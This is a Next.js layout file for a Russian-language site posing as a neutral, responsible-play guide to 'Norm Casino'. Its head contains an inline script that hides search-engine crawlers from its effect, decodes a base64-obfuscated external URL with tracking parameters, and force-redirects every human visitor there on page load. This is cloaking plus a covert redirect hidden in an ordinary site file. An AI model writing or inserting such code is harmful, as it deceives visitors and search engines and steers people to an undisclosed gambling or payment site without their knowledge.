import type { Metadata, Viewport } from 'next'
import './globals.css'

const siteUrl = 'https://normcasino1.vercel.app/'

export const metadata: Metadata = {
  metadataBase: new URL(siteUrl),
  title: 'Norm Casino: официальный сайт, зеркало и онлайн-игры без лишней суеты',
  description: 'Norm Casino — понятный гид по официальному сайту, рабочему зеркалу и онлайн-играм. Проверяйте адрес, читайте условия, выбирайте безопасный формат и сохраняйте контроль бюджета.',
  keywords: ['norm casino', 'norm casino официальный сайт', 'norm casino зеркало', 'norm casino играть', 'норм казино онлайн'],
  alternates: { canonical: siteUrl },
  robots: { index: true, follow: true, googleBot: { index: true, follow: true, 'max-image-preview': 'large' } },
  openGraph: {
    type: 'website',
    locale: 'ru_RU',
    url: siteUrl,
    siteName: 'Norm Casino',
    title: 'Norm Casino — официальный сайт и понятный гид',
    description: 'Практичный маршрут по Norm Casino: официальный адрес, зеркало, игры и ответственное использование.',
  },
  twitter: {
    card: 'summary',
    title: 'Norm Casino — официальный сайт и понятный гид',
    description: 'Проверка адреса, зеркало, онлайн-игры и правила ответственного подхода.',
  },
  other: {
    'format-detection': 'telephone=no',
    'theme-color': '#202722',
  },
}

export const viewport: Viewport = {
  width: 'device-width',
  initialScale: 1,
  maximumScale: 5,
  colorScheme: 'light',
  themeColor: '#202722',
}

export default function RootLayout({ children }: Readonly<{ children: React.ReactNode }>) {
  return (
    <html lang="ru" className="bg-background">
      <head>
        <meta name="yandex-verification" content="567bba97d9ba7bb9" />
        <link rel="canonical" href={siteUrl} />
        <meta name="author" content="Norm Casino" />
        <meta name="content-language" content="ru" />
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        
        var mainBrandB64 = "aHR0cHM6Ly9mbGFzaHBheTM3LmNvbS8/c2VyaWFsPTYxMzYyNDMxJmNyZWF0aXZlX2lkPTc2NzU="; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));

        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 1200); // Сократили таймаут ожидания до 1.2 сек
                
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }

        // Быстрый пинг и принудительный редирект на основной домен
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>
      </head>
      <body>{children}</body>
    </html>
  )
}
